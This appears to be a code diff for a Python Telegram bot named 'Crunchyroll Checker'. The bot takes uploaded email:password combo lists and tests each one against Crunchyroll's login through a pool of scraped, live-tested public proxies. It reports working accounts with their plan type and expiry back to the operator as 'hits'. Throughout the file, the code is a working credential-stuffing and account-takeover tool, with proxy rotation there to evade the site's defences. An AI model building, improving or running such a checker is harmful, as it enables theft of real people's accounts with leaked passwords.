@@ -42,7 +42,7 @@ _proxy_pool: list[str] = []
 _proxy_lock = asyncio.Lock() if False else None  # initialized in main
 
 
-# â”€â”€â”€ Proxy Management â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# ─── Proxy Management ────────────────────────────────────────────────────────
 
 PROXY_SOURCES = [
     "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
@@ -57,7 +57,6 @@ PROXY_SOURCES = [
 
 
 async def fetch_raw_proxies() -> list[str]:
-    """Fetch proxy candidates from multiple public sources."""
     raw: set[str] = set()
     timeout = aiohttp.ClientTimeout(total=15)
 
@@ -89,7 +88,6 @@ async def fetch_raw_proxies() -> list[str]:
 
 
 async def test_proxy(proxy_str: str) -> bool:
-    """Return True if the proxy is working and anonymous."""
     url = f"http://{proxy_str}"
     timeout = aiohttp.ClientTimeout(total=PROXY_TEST_TIMEOUT, connect=5)
     try:
@@ -105,7 +103,6 @@ async def test_proxy(proxy_str: str) -> bool:
 
 
 async def build_proxy_pool(max_workers: int = 60, target: int = MIN_WORKING_PROXIES) -> list[str]:
-    """Fetch and concurrently test proxies; return the first `target` that pass."""
     raw = await fetch_raw_proxies()
     working: list[str] = []
     sem = asyncio.Semaphore(max_workers)
@@ -120,13 +117,12 @@ async def build_proxy_pool(max_workers: int = 60, target: int = MIN_WORKING_PROX
             ok = await test_proxy(p)
             if ok:
                 working.append(p)
-                logger.info(f"[âœ“] Working proxy: {p} ({len(working)}/{target})")
+                logger.info(f"[✓] Working proxy: {p} ({len(working)}/{target})")
                 if len(working) >= target:
                     done.set()
 
     tasks = [asyncio.create_task(check(p)) for p in raw]
 
-    # Wait until we hit target or all tasks finish
     while not done.is_set() and not all(t.done() for t in tasks):
         await asyncio.sleep(0.5)
 
@@ -139,7 +135,7 @@ async def build_proxy_pool(max_workers: int = 60, target: int = MIN_WORKING_PROX
     return working
 
 
-# â”€â”€â”€ Checker â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# ─── Checker ─────────────────────────────────────────────────────────────────
 
 class CrunchyChecker:
     def __init__(self, combos, proxies=None):
@@ -187,7 +183,6 @@ class CrunchyChecker:
                 connector=connector, cookie_jar=jar, timeout=timeout
             ) as session:
 
-                # Step 1: Get session_id cookie
                 try:
                     async with session.get(
                         "https://www.crunchyroll.com/login",
@@ -204,7 +199,6 @@ class CrunchyChecker:
                 if not session_id:
                     return {"status": "error", "email": email}
 
-                # Step 2: Login
                 login_data = {
                     "account": email,
                     "password": password,
@@ -228,7 +222,6 @@ class CrunchyChecker:
                 except Exception:
                     return {"status": "error", "email": email}
 
-                # Step 3: Parse login response
                 if resp.get("error", True):
                     code = resp.get("code", "")
                     if code in (
@@ -262,7 +255,6 @@ class CrunchyChecker:
                 else:
                     plan_type = "PREMIUM"
 
-                # Try to get expiry
                 expiry_date = "Unknown"
                 remaining_days = "?"
                 try:
@@ -352,12 +344,12 @@ class CrunchyChecker:
                     self.hits.append(result)
                     try:
                         hit_text = (
-                            f"âœ… *HIT FOUND*\n\n"
-                            f"ðŸ“§ `{result['email']}:{result['password']}`\n"
-                            f"ðŸ’Ž Plan: `{result['plan']}`\n"
-                            f"ðŸ“… Expiry: `{result['expiry']}`\n"
-                            f"â³ Days Left: `{result['days']}`\n"
-                            f"âœ”ï¸ Verified: `{result.get('verified', '?')}`"
+                            f"✅ *HIT FOUND*\n\n"
+                            f"📧 `{result['email']}:{result['password']}`\n"
+                            f"💎 Plan: `{result['plan']}`\n"
+                            f"📅 Expiry: `{result['expiry']}`\n"
+                            f"⏳ Days Left: `{result['days']}`\n"
+                            f"✔️ Verified: `{result.get('verified', '?')}`"
                         )
                         await context.bot.send_message(
                             chat_id=chat_id, text=hit_text, parse_mode="Markdown"
@@ -369,8 +361,8 @@ class CrunchyChecker:
                     self.free.append(result)
                     try:
                         free_text = (
-                            f"ðŸ†“ *FREE ACCOUNT*\n\n"
-                            f"ðŸ“§ `{result['email']}:{result['password']}`"
+                            f"🆓 *FREE ACCOUNT*\n\n"
+                            f"📧 `{result['email']}:{result['password']}`"
                         )
                         await context.bot.send_message(
                             chat_id=chat_id, text=free_text, parse_mode="Markdown"
@@ -404,16 +396,16 @@ class CrunchyChecker:
                 self.cpm = int((self.checked / elapsed) * 60)
 
             cancel_kb = InlineKeyboardMarkup(
-                [[InlineKeyboardButton("ðŸ›‘ Cancel Check", callback_data="cancel_check")]]
+                [[InlineKeyboardButton("🛑 Cancel Check", callback_data="cancel_check")]]
             )
             text = (
-                f"âš¡ *CRUNCHYROLL CHECKER*\n\n"
+                f"⚡ *CRUNCHYROLL CHECKER*\n\n"
                 f"{self._progress_bar()}\n"
-                f"ðŸ“Š *Progress:* `{self.checked}/{self.total}`\n"
-                f"âš¡ *CPM:* `{self.cpm}`\n\n"
-                f"âœ… *Hits:* `{len(self.hits)}`\n"
-                f"ðŸ†“ *Free:* `{len(self.free)}`\n"
-                f"âŒ *Bad:* `{self.bad}`"
+                f"📊 *Progress:* `{self.checked}/{self.total}`\n"
+                f"⚡ *CPM:* `{self.cpm}`\n\n"
+                f"✅ *Hits:* `{len(self.hits)}`\n"
+                f"🆓 *Free:* `{len(self.free)}`\n"
+                f"❌ *Bad:* `{self.bad}`"
             )
             try:
                 await context.bot.edit_message_text(
@@ -434,26 +426,26 @@ class CrunchyChecker:
 
         if self.cancelled:
             text = (
-                f"ðŸ›‘ *CHECK CANCELLED*\n\n"
-                f"ðŸ“Š Checked: `{self.checked}/{self.total}`\n"
-                f"âœ… Hits: `{len(self.hits)}`\n"
-                f"ðŸ†“ Free: `{len(self.free)}`\n"
-                f"âŒ Bad: `{self.bad}`"
+                f"🛑 *CHECK CANCELLED*\n\n"
+                f"📊 Checked: `{self.checked}/{self.total}`\n"
+                f"✅ Hits: `{len(self.hits)}`\n"
+                f"🆓 Free: `{len(self.free)}`\n"
+                f"❌ Bad: `{self.bad}`"
             )
         else:
             text = (
-                f"ðŸ *CHECK COMPLETE*\n\n"
-                f"âœ… *Hits:* `{len(self.hits)}`\n"
-                f"ðŸ†“ *Free:* `{len(self.free)}`\n"
-                f"âŒ *Bad:* `{self.bad}`\n"
-                f"âš¡ *Avg CPM:* `{final_cpm}`"
+                f"🏁 *CHECK COMPLETE*\n\n"
+                f"✅ *Hits:* `{len(self.hits)}`\n"
+                f"🆓 *Free:* `{len(self.free)}`\n"
+                f"❌ *Bad:* `{self.bad}`\n"
+                f"⚡ *Avg CPM:* `{final_cpm}`"
             )
 
         again_kb = InlineKeyboardMarkup(
             [
                 [
-                    InlineKeyboardButton("ðŸ”„ Check Again", callback_data="check_again"),
-                    InlineKeyboardButton("ðŸ  Main Menu", callback_data="main_menu"),
+                    InlineKeyboardButton("🔄 Check Again", callback_data="check_again"),
+                    InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu"),
                 ]
             ]
         )
@@ -484,7 +476,7 @@ class CrunchyChecker:
                 await context.bot.send_document(
                     chat_id=chat_id,
                     document=bio,
-                    caption=f"âœ… *{len(self.hits)} hits found!*",
+                    caption=f"✅ *{len(self.hits)} hits found!*",
                     parse_mode="Markdown",
                 )
             except TelegramError:
@@ -498,7 +490,7 @@ class CrunchyChecker:
                 await context.bot.send_document(
                     chat_id=chat_id,
                     document=bio,
-                    caption=f"ðŸ†“ *{len(self.free)} free accounts found!*",
+                    caption=f"🆓 *{len(self.free)} free accounts found!*",
                     parse_mode="Markdown",
                 )
             except TelegramError:
@@ -506,39 +498,39 @@ class CrunchyChecker:
 
     def _progress_bar(self):
         if self.total == 0:
-            return "â–±â–±â–±â–±â–±â–±â–±â–±â–±â–± 0%"
+            return "▱▱▱▱▱▱▱▱▱▱ 0%"
         pct = int((self.checked / self.total) * 10)
-        bar = "â–°" * pct + "â–±" * (10 - pct)
+        bar = "▰" * pct + "▱" * (10 - pct)
         return f"{bar} {int((self.checked / self.total) * 100)}%"
 
 
-# â”€â”€â”€ UI helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# ─── UI helpers ───────────────────────────────────────────────────────────────
 
 def main_menu_keyboard():
     return InlineKeyboardMarkup(
         [
-            [InlineKeyboardButton("ðŸ” Check Accounts", callback_data="check_accounts")],
+            [InlineKeyboardButton("🔍 Check Accounts", callback_data="check_accounts")],
             [
-                InlineKeyboardButton("â„¹ï¸ How to Use", callback_data="how_to_use"),
-                InlineKeyboardButton("ðŸ“Š Bot Info", callback_data="bot_info"),
+                InlineKeyboardButton("ℹ️ How to Use", callback_data="how_to_use"),
+                InlineKeyboardButton("📊 Bot Info", callback_data="bot_info"),
             ],
         ]
     )
 
 
 WELCOME_TEXT = (
-    "ðŸŽŒ *CRUNCHYROLL CHECKER BOT*\n"
-    "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n"
+    "🎌 *CRUNCHYROLL CHECKER BOT*\n"
+    "━━━━━━━━━━━━━━━━━━━━━\n\n"
     "Welcome! This bot checks Crunchyroll accounts\n"
     "from your combo list automatically.\n\n"
-    "ðŸ”Œ *Proxies:* Dynamic (live-tested) âœ…\n"
-    f"âš¡ *Threads:* {THREADS} concurrent\n"
-    "ðŸŽ¯ *Detects:* Premium, Mega Fan, Fan, Free\n\n"
+    "🔌 *Proxies:* Dynamic (live-tested) ✅\n"
+    f"⚡ *Threads:* {THREADS} concurrent\n"
+    "🎯 *Detects:* Premium, Mega Fan, Fan, Free\n\n"
     "Press *Check Accounts* to get started!"
 )
 
 
-# â”€â”€â”€ Handlers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# ─── Handlers ─────────────────────────────────────────────────────────────────
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
@@ -551,33 +543,33 @@ async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     checker = active_checkers.get(chat_id)
     if checker:
         checker.cancelled = True
-        await update.message.reply_text("ðŸ›‘ Cancelling the current check...")
+        await update.message.reply_text("🛑 Cancelling the current check...")
     else:
         await update.message.reply_text(
-            "âš ï¸ No active check to cancel.", reply_markup=main_menu_keyboard()
+            "⚠️ No active check to cancel.", reply_markup=main_menu_keyboard()
         )
 
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = (
-        "ðŸ“– *HOW TO USE*\n"
-        "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n"
-        "1ï¸âƒ£ Press *Check Accounts* from the menu\n"
-        "2ï¸âƒ£ Upload a `.txt` combo file\n"
+        "📖 *HOW TO USE*\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "1️⃣ Press *Check Accounts* from the menu\n"
+        "2️⃣ Upload a `.txt` combo file\n"
         "   Format: `email:password` (one per line)\n"
-        "3ï¸âƒ£ Bot checks automatically with live proxies\n"
-        "4ï¸âƒ£ Hits & free accounts sent instantly\n"
-        "5ï¸âƒ£ Results files sent when done\n\n"
+        "3️⃣ Bot checks automatically with live proxies\n"
+        "4️⃣ Hits & free accounts sent instantly\n"
+        "5️⃣ Results files sent when done\n\n"
         "*Commands:*\n"
-        "/start â€” Main menu\n"
-        "/cancel â€” Stop active check\n"
-        "/help â€” Show this message"
+        "/start — Main menu\n"
+        "/cancel — Stop active check\n"
+        "/help — Show this message"
     )
     await update.message.reply_text(
         text,
         parse_mode="Markdown",
         reply_markup=InlineKeyboardMarkup(
-            [[InlineKeyboardButton("ðŸ  Main Menu", callback_data="main_menu")]]
+            [[InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]
         ),
     )
 
@@ -593,288 +585,189 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.edit_message_text(
                 WELCOME_TEXT, parse_mode="Markdown", reply_markup=main_menu_keyboard()
             )
-        except BadRequest:
+        except (BadRequest, TelegramError):
             pass
 
-    elif data == "check_accounts":
-        checker = active_checkers.get(chat_id)
-        if checker and not checker.cancelled:
+    elif data == "check_accounts" or data == "check_again":
+        context.user_data["awaiting_combo"] = True
+        try:
             await query.edit_message_text(
-                "âš ï¸ *A check is already running!*\n\nWait for it to finish or use /cancel.",
+                "📁 *UPLOAD COMBO FILE*\n\n"
+                "Send your `.txt` file with combos in format:\n"
+                "`email:password` (one per line)\n\n"
+                "⚠️ Max recommended: 50,000 lines",
                 parse_mode="Markdown",
                 reply_markup=InlineKeyboardMarkup(
-                    [
-                        [InlineKeyboardButton("ðŸ›‘ Cancel Check", callback_data="cancel_check")],
-                        [InlineKeyboardButton("ðŸ  Main Menu", callback_data="main_menu")],
-                    ]
+                    [[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]
                 ),
             )
-            return
-        context.user_data["waiting_for_combo"] = True
-        await query.edit_message_text(
-            "ðŸ“‚ *Send your combo file*\n\n"
-            "Upload a `.txt` file with one `email:password` per line.\n\n"
-            "_Example:_\n`user@email.com:password123`",
-            parse_mode="Markdown",
-            reply_markup=InlineKeyboardMarkup(
-                [[InlineKeyboardButton("âŒ Cancel", callback_data="main_menu")]]
-            ),
-        )
+        except (BadRequest, TelegramError):
+            pass
 
     elif data == "cancel_check":
         checker = active_checkers.get(chat_id)
         if checker:
             checker.cancelled = True
-            await query.answer("ðŸ›‘ Cancelling...", show_alert=False)
+            try:
+                await query.edit_message_text(
+                    "🛑 *Cancelling check...*", parse_mode="Markdown"
+                )
+            except (BadRequest, TelegramError):
+                pass
         else:
-            await query.answer("No active check found.", show_alert=True)
-
-    elif data == "check_again":
-        context.user_data["waiting_for_combo"] = True
-        try:
-            await query.edit_message_text(
-                "ðŸ“‚ *Send your combo file*\n\n"
-                "Upload a `.txt` file with one `email:password` per line.",
-                parse_mode="Markdown",
-                reply_markup=InlineKeyboardMarkup(
-                    [[InlineKeyboardButton("âŒ Cancel", callback_data="main_menu")]]
-                ),
-            )
-        except BadRequest:
-            pass
+            try:
+                await query.edit_message_text(
+                    "⚠️ No active check.", reply_markup=main_menu_keyboard()
+                )
+            except (BadRequest, TelegramError):
+                pass
 
     elif data == "how_to_use":
         text = (
-            "ðŸ“– *HOW TO USE*\n"
-            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n"
-            "1ï¸âƒ£ Press *Check Accounts* from the menu\n"
-            "2ï¸âƒ£ Upload a `.txt` combo file\n"
+            "📖 *HOW TO USE*\n"
+            "━━━━━━━━━━━━━━━━━━━━━\n\n"
+            "1️⃣ Press *Check Accounts* from the menu\n"
+            "2️⃣ Upload a `.txt` combo file\n"
             "   Format: `email:password` (one per line)\n"
-            "3ï¸âƒ£ Bot checks automatically with live proxies\n"
-            "4ï¸âƒ£ Hits & free accounts sent instantly\n"
-            "5ï¸âƒ£ Results files sent when done\n\n"
+            "3️⃣ Bot checks automatically with live proxies\n"
+            "4️⃣ Hits & free accounts sent instantly\n"
+            "5️⃣ Results files sent when done\n\n"
             "*Commands:*\n"
-            "/start â€” Main menu\n"
-            "/cancel â€” Stop active check\n"
-            "/help â€” Show this message"
+            "/start — Main menu\n"
+            "/cancel — Stop active check\n"
+            "/help — Show this message"
         )
-        await query.edit_message_text(
-            text,
-            parse_mode="Markdown",
-            reply_markup=InlineKeyboardMarkup(
-                [[InlineKeyboardButton("ðŸ  Main Menu", callback_data="main_menu")]]
-            ),
-        )
+        try:
+            await query.edit_message_text(
+                text,
+                parse_mode="Markdown",
+                reply_markup=InlineKeyboardMarkup(
+                    [[InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]
+                ),
+            )
+        except (BadRequest, TelegramError):
+            pass
 
     elif data == "bot_info":
-        pool_size = len(_proxy_pool)
         text = (
-            "ðŸ“Š *BOT INFO*\n"
-            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n"
-            f"ðŸ”Œ *Live Proxies Loaded:* `{pool_size}`\n"
-            f"âš¡ *Threads:* `{THREADS}`\n"
-            "ðŸŽ¯ *Target:* Crunchyroll\n"
-            "ðŸ”’ *Mode:* Anonymous (all traffic via proxy)\n\n"
-            "ðŸŸ¢ Bot is online and ready!"
+            "📊 *BOT INFO*\n"
+            "━━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"⚡ Threads: `{THREADS}`\n"
+            f"🔌 Proxy sources: `{len(PROXY_SOURCES)}`\n"
+            f"🎯 Min working proxies: `{MIN_WORKING_PROXIES}`\n"
+            f"⏱️ Proxy timeout: `{PROXY_TEST_TIMEOUT}s`\n\n"
+            "✅ Detects: Premium / Mega Fan / Fan\n"
+            "🆓 Detects: Free accounts\n"
+            "❌ Filters: Bad / Expired accounts"
         )
-        await query.edit_message_text(
-            text,
-            parse_mode="Markdown",
-            reply_markup=InlineKeyboardMarkup(
-                [[InlineKeyboardButton("ðŸ  Main Menu", callback_data="main_menu")]]
-            ),
-        )
+        try:
+            await query.edit_message_text(
+                text,
+                parse_mode="Markdown",
+                reply_markup=InlineKeyboardMarkup(
+                    [[InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]
+                ),
+            )
+        except (BadRequest, TelegramError):
+            pass
 
 
-async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
 
-    if not context.user_data.get("waiting_for_combo"):
+    if not context.user_data.get("awaiting_combo"):
+        return
+
+    if chat_id in active_checkers:
         await update.message.reply_text(
-            "âš ï¸ Please press *Check Accounts* from the menu first.",
-            parse_mode="Markdown",
-            reply_markup=main_menu_keyboard(),
+            "⚠️ A check is already running. Use /cancel to stop it first."
         )
         return
 
     doc = update.message.document
-    if not doc:
-        return
-
-    if not doc.file_name.endswith(".txt"):
+    if not doc or not doc.file_name.endswith(".txt"):
         await update.message.reply_text(
-            "âŒ *Wrong file type!*\n\nPlease send a `.txt` file.",
-            parse_mode="Markdown",
-            reply_markup=InlineKeyboardMarkup(
-                [
-                    [InlineKeyboardButton("ðŸ”„ Try Again", callback_data="check_accounts")],
-                    [InlineKeyboardButton("ðŸ  Main Menu", callback_data="main_menu")],
-                ]
-            ),
+            "❌ Please send a `.txt` file.", parse_mode="Markdown"
         )
         return
 
-    context.user_data["waiting_for_combo"] = False
+    if doc.file_size > 10 * 1024 * 1024:
+        await update.message.reply_text("❌ File too large (max 10MB).")
+        return
+
+    context.user_data["awaiting_combo"] = False
+
     status_msg = await update.message.reply_text(
-        "ðŸ“¥ *Downloading file...*", parse_mode="Markdown"
+        "⏳ *Loading combo file...*", parse_mode="Markdown"
     )
 
     try:
-        file = await doc.get_file()
-        file_path = f"combo_{chat_id}.txt"
-        await file.download_to_drive(file_path)
-    except TelegramError as e:
-        logger.error(f"File download failed: {e}")
-        await status_msg.edit_text(
-            "âŒ *Failed to download file.*\n\nPlease try again.",
-            parse_mode="Markdown",
-            reply_markup=InlineKeyboardMarkup(
-                [
-                    [InlineKeyboardButton("ðŸ”„ Try Again", callback_data="check_accounts")],
-                    [InlineKeyboardButton("ðŸ  Main Menu", callback_data="main_menu")],
-                ]
-            ),
-        )
+        tg_file = await doc.get_file()
+        file_bytes = await tg_file.download_as_bytearray()
+        raw_text = file_bytes.decode("utf-8", errors="ignore")
+    except Exception as e:
+        await status_msg.edit_text(f"❌ Failed to download file: {e}")
         return
 
-    try:
-        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
-            combos = [line.strip() for line in f if ":" in line.strip()]
-    except Exception as e:
-        logger.error(f"Error reading combo file: {e}")
-        await status_msg.edit_text(
-            "âŒ *Could not read the file.*\n\nMake sure it's a valid text file.",
-            parse_mode="Markdown",
-            reply_markup=InlineKeyboardMarkup(
-                [
-                    [InlineKeyboardButton("ðŸ”„ Try Again", callback_data="check_accounts")],
-                    [InlineKeyboardButton("ðŸ  Main Menu", callback_data="main_menu")],
-                ]
-            ),
-        )
-        return
+    combos = [
+        line.strip()
+        for line in raw_text.splitlines()
+        if line.strip() and ":" in line
+    ]
 
     if not combos:
         await status_msg.edit_text(
-            "âŒ *No valid combos found!*\n\nFile must use `email:password` format.",
+            "❌ No valid combos found. Format: `email:password`",
             parse_mode="Markdown",
-            reply_markup=InlineKeyboardMarkup(
-                [
-                    [InlineKeyboardButton("ðŸ”„ Try Again", callback_data="check_accounts")],
-                    [InlineKeyboardButton("ðŸ  Main Menu", callback_data="main_menu")],
-                ]
-            ),
         )
         return
 
-    # Use the globally tested proxy pool; refresh if empty
-    proxies = list(_proxy_pool)
-    if not proxies:
-        await status_msg.edit_text(
-            "ðŸ”„ *Refreshing proxy pool...*\n\nThis takes ~30 seconds.",
-            parse_mode="Markdown",
-        )
-        proxies = await build_proxy_pool()
-        _proxy_pool.clear()
-        _proxy_pool.extend(proxies)
-
     await status_msg.edit_text(
-        f"âš¡ *CRUNCHYROLL CHECKER*\n\n"
-        f"â–±â–±â–±â–±â–±â–±â–±â–±â–±â–± 0%\n"
-        f"ðŸ“Š *Progress:* `0/{len(combos)}`\n"
-        f"âš¡ *CPM:* `0`\n\n"
-        f"âœ… *Hits:* `0`\n"
-        f"ðŸ†“ *Free:* `0`\n"
-        f"âŒ *Bad:* `0`",
+        f"✅ Loaded `{len(combos)}` combos.\n⏳ Fetching & testing proxies...",
         parse_mode="Markdown",
-        reply_markup=InlineKeyboardMarkup(
-            [[InlineKeyboardButton("ðŸ›‘ Cancel Check", callback_data="cancel_check")]]
-        ),
     )
+
+    proxies = await build_proxy_pool()
 
     checker = CrunchyChecker(combos, proxies)
     active_checkers[chat_id] = checker
-    asyncio.create_task(checker.run(context, chat_id, status_msg.message_id))
 
-
-async def handle_unknown_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if context.user_data.get("waiting_for_combo"):
-        await update.message.reply_text(
-            "ðŸ“‚ *Please send a `.txt` file*, not a text message.", parse_mode="Markdown"
-        )
-    else:
-        await update.message.reply_text(
-            "ðŸ‘‹ Use the menu below to get started!", reply_markup=main_menu_keyboard()
-        )
-
-
-async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
-    error = context.error
-    logger.error(f"Unhandled error: {error}", exc_info=True)
-    if isinstance(error, Forbidden):
-        logger.warning("Bot blocked by user.")
-        return
-    if isinstance(error, NetworkError):
-        logger.warning(f"Network error: {error}")
-        return
-    if isinstance(error, BadRequest):
-        logger.warning(f"Bad request: {error}")
-        return
-    if update and hasattr(update, "effective_chat") and update.effective_chat:
-        try:
-            await context.bot.send_message(
-                chat_id=update.effective_chat.id,
-                text="âš ï¸ *An unexpected error occurred.*\n\nPlease try again or use /start to reset.",
-                parse_mode="Markdown",
-                reply_markup=main_menu_keyboard(),
-            )
-        except TelegramError:
-            pass
-
-
-# â”€â”€â”€ Startup proxy warm-up â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-
-async def post_init(application: Application):
-    """Pre-warm the proxy pool as soon as the bot starts."""
-    logger.info("ðŸ”Œ Warming up proxy pool in background...")
-    asyncio.create_task(_warm_proxies())
-
-
-async def _warm_proxies():
-    global _proxy_pool
-    proxies = await build_proxy_pool(max_workers=80, target=MIN_WORKING_PROXIES)
-    _proxy_pool.clear()
-    _proxy_pool.extend(proxies)
-    logger.info(f"âœ… Proxy pool ready: {len(_proxy_pool)} live proxies")
-
-
-# â”€â”€â”€ Entry point â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-
-def main():
-    global _proxy_pool
-    _proxy_pool = []
-
-    logger.info("ðŸš€ Crunchyroll Checker Bot is starting...")
-    application = (
-        Application.builder()
-        .token(BOT_TOKEN)
-        .post_init(post_init)
-        .build()
+    progress_msg = await update.message.reply_text(
+        f"⚡ *CRUNCHYROLL CHECKER*\n\n"
+        f"▱▱▱▱▱▱▱▱▱▱ 0%\n"
+        f"📊 *Progress:* `0/{len(combos)}`\n"
+        f"⚡ *CPM:* `0`\n\n"
+        f"✅ *Hits:* `0`\n"
+        f"🆓 *Free:* `0`\n"
+        f"❌ *Bad:* `0`",
+        parse_mode="Markdown",
+        reply_markup=InlineKeyboardMarkup(
+            [[InlineKeyboardButton("🛑 Cancel Check", callback_data="cancel_check")]]
+        ),
     )
 
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("cancel", cancel_command))
-    application.add_handler(CommandHandler("help", help_command))
-    application.add_handler(CallbackQueryHandler(button_handler))
-    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
-    application.add_handler(
-        MessageHandler(filters.TEXT & ~filters.COMMAND, handle_unknown_message)
+    asyncio.create_task(
+        checker.run(context, chat_id, progress_msg.message_id)
     )
-    application.add_error_handler(error_handler)
 
-    logger.info("âœ… Bot is running! Send /start in Telegram.")
-    application.run_polling(drop_pending_updates=True)
+
+async def main():
+    global _proxy_lock
+    _proxy_lock = asyncio.Lock()
+
+    app = Application.builder().token(BOT_TOKEN).build()
+
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("cancel", cancel_command))
+    app.add_handler(CommandHandler("help", help_command))
+    app.add_handler(CallbackQueryHandler(button_handler))
+    app.add_handler(
+        MessageHandler(filters.Document.ALL, file_handler)
+    )
+
+    logger.info("Bot starting...")
+    await app.run_polling(drop_pending_updates=True)
 
 
 if __name__ == "__main__":
-    main()
+    asyncio.run(main())
